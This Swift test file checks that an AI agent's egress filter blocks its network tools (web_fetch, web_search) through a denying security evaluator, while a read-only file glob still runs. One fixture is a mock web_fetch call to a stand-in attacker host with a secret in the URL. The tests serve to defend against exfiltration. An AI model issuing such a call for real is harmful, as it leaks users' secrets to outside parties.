import Testing
import Foundation
import SwiftLLMKit
@testable import AgentSmithKit

/// The Smith egress filter: Smith reviews ONLY open-world (network) tool calls through the Security
/// Agent, while local read-only tools run un-reviewed. Drives a REAL Smith `AgentActor` through the
/// live loop with a DENYING evaluator and asserts that web tools are blocked but a local tool still
/// runs — proving the gate is scoped to egress, not everything.
@Suite("Smith egress filter", .serialized)
struct SmithEgressFilterTests {

    private final class HistoryRecorder: @unchecked Sendable {
        private let lock = NSLock()
        private var latest: [LLMMessage] = []
        func update(_ messages: [LLMMessage]) { lock.lock(); defer { lock.unlock() }; latest = messages }
        var snapshot: [LLMMessage] { lock.lock(); defer { lock.unlock() }; return latest }
    }

    private func smithConfig() -> AgentConfiguration {
        AgentConfiguration(
            role: .smith,
            llmConfig: ModelConfiguration(
                name: "test", providerID: "test", modelID: "test-model",
                maxOutputTokens: 1024, maxContextTokens: 100_000
            ),
            systemPrompt: "test"
        )
    }

    /// A Security Agent that denies everything it's asked to evaluate.
    private func denyingEvaluator() -> SecurityEvaluator {
        SecurityEvaluator(
            provider: MockLLMProvider(responses: Array(repeating: LLMResponse(text: "UNSAFE: blocked for test"), count: 8)),
            systemPrompt: "security gatekeeper",
            channel: MessageChannel(),
            abort: { _, _ in },
            hasToolSucceeded: { _ in false },
            hasToolFailed: { _ in false }
        )
    }

    /// Drives a Smith actor with the egress filter ON and a DENYING evaluator, issuing one tool call.
    /// Returns the tool-result string for that call.
    private func runSmith(tool: any AgentTool, call: LLMToolCall) async -> String? {
        let channel = MessageChannel()
        let taskStore = TaskStore()
        let agentID = UUID()
        let context = TestToolContext.make(agentID: agentID, agentRole: .smith, channel: channel, taskStore: taskStore)
        let provider = MockLLMProvider(responses: [
            LLMResponse(toolCalls: [call]),
            LLMResponse(text: ""), LLMResponse(text: ""), LLMResponse(text: "")
        ])
        let agent = AgentActor(
            id: agentID, configuration: smithConfig(), provider: provider,
            tools: [tool], toolContext: context
        )
        await agent.setSecurityEvaluator(denyingEvaluator())
        await agent.setEvaluatesOpenWorldToolsOnly(true)
        let history = HistoryRecorder()
        await agent.setOnContextChanged { messages in history.update(messages) }
        await agent.start(initialInstruction: "go")

        let deadline = Date().addingTimeInterval(3.0)
        while await agent.running, Date() < deadline {
            try? await Task.sleep(for: .milliseconds(20))
        }
        await agent.stop()

        for message in history.snapshot where message.role == .tool {
            if case .toolResult(let id, let content) = message.content, id == call.id {
                return content
            }
        }
        return nil
    }

    @Test("Smith's web_fetch is gated — a denying Security Agent blocks it (no network)")
    func webFetchGated() async {
        let call = LLMToolCall(id: "wf-1", name: "web_fetch",
                               arguments: #"{"url":"https://evil.example/?d=secret"}"#)
        let result = await runSmith(tool: WebFetchTool(), call: call)
        #expect(result?.contains("denied") == true, "web_fetch must be blocked by the egress gate")
    }

    @Test("Smith's web_search is gated")
    func webSearchGated() async {
        let call = LLMToolCall(id: "ws-1", name: "web_search", arguments: #"{"query":"anything"}"#)
        let result = await runSmith(tool: WebSearchTool(), call: call)
        #expect(result?.contains("denied") == true, "web_search must be blocked by the egress gate")
    }

    @Test("Smith's read-only glob is auto-approved and RUNS even though the Security Agent would deny")
    func readOnlyAutoApprovedAndRuns() async throws {
        // glob is a read-only filesystem evidence tool. Smith routes it through the security path
        // (so it's visible + centrally gated), but the evaluator auto-approves it without an LLM
        // call — so even with a DENYING evaluator, it executes. This proves the auto-approve
        // fast-path fires BEFORE the LLM verdict is consulted.
        let dir = TempDir()
        defer { dir.cleanup() }
        _ = try dir.write("hello", to: "a.txt")
        let call = LLMToolCall(id: "g-1", name: "glob",
                               arguments: #"{"pattern":"**/*.txt","path":"\#(dir.path)"}"#)
        let result = await runSmith(tool: GlobTool(useSpotlight: false), call: call)
        #expect(result != nil, "glob should have executed")
        #expect(result?.contains("denied") != true, "a read-only evidence tool is auto-approved, not denied")
        #expect(result?.contains("a.txt") == true, "glob should have found the file")
    }
}
